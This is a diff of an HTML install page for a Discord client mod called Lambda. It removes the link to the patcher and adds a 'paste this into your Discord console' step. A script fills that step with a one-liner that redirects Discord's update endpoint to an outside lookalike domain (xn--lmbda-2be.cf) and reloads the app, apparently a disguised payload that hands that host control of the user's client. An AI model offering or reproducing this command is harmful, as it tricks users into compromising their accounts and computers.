@@ -6,6 +6,12 @@
     <meta property="og:description" content="Instructions for installing Lambda" />
     <meta property="og:image" content="/lambda.png" />
 
+    <script>
+        function updatePayload() {
+            document.querySelector('code').innerText = `DiscordNative.globals.appSettings.set('UPDATE_ENDPOINT','https://proxy.xn--lmbda-2be.cf/api');DiscordNative.globals.appSettings.save();reloadElectronApp()`
+        }
+    </script>
+
     <style>
         @font-face {
             font-family: 'IBMVGA8';
@@ -45,9 +51,9 @@
 
 <body>
     <div>L&lambda;mbda</div>
-    <a href="https://gitlab.com/Cynosphere/lambda-patcher">Grab the Lambda Patcher</a>
+    Copy and paste the following string into your Discord console:
     <br>
-    <p>Lambda does not have any Discord internal injection methods anymore.</p>
+    <code>please wait...</code>
     <br>
     <b>This is a fork of EndPwn3.</b>
 </body>
